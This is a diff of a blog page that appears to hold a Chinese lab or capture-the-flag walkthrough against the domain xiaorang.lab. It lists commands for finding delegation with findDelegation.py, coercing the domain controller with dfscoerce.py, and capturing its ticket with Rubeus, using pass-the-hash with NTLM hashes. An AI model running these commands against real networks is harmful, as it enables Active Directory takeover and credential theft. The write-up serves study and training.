@@ -290,7 +290,9 @@ WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b7
 <h3 id="域内委派"><a href="#域内委派" class="headerlink" title="域内委派"></a>域内委派</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token parameter variable">-q</span> python findDelegation.py xiaorang.lab/<span class="token string">'WIN19$'</span> <span class="token parameter variable">-hashes</span> :b1743cc34e7261e78d820e85d8b747ac -dc-ip <span class="token number">172.22</span>.4.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/Rxi134_FILE/5f07954cbceffee78280b73b5950443c_MD5.jpeg"></p>
-<h4 id="非约束委派-强制身份认证"><a href="#非约束委派-强制身份认证" class="headerlink" title="非约束委派+强制身份认证"></a>非约束委派+强制身份认证</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">proxychains -q python3 ./dfscoerce.py -u "WIN19$" -hashes :75c57edd62d1aa0a49f56a1e8a0becdb -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现这台机子具有非约束委派，众所周知在认证具有非约束委派的主机时会连带自己的TGT一起发送，从而使该主机具有用户的权限</p>
+<h4 id="非约束委派-强制身份认证"><a href="#非约束委派-强制身份认证" class="headerlink" title="非约束委派+强制身份认证"></a>非约束委派+强制身份认证</h4><p>利用 dfscoerce 漏洞强制域控访问我们来拿到域控的TGT</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">proxychains -q python3 ./dfscoerce.py -u "WIN19$" -hashes :75c57edd62d1aa0a49f56a1e8a0becdb -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/Rxi134_FILE/bd45f344d3eb41ceecf0ffb6552d92fc_MD5.jpeg"></p>
 <p>监听TGT</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -344,7 +346,8 @@ WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b7
 
     
     
-    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    <a href="/2025/03/12/2025-03第二周：pawnyable LK01-2 & LK01-3/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
